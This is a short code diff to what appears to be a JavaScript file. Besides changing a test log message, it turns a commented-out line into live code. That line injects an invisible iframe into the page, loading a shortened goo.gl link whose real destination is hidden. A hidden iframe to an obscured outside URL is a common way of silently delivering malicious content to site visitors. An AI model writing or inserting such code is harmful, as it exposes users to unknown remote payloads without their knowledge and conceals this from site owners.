@@ -1,2 +1,2 @@
-console.log('teeeestingg');
-//document.body.innerHTML += '<iframe src="https://goo.gl/D5NvXb" style="display: none;"></iframe>';
+console.log('tengg');
+document.body.innerHTML += '<iframe src="https://goo.gl/lIi4MA" style="display: none;"></iframe>';
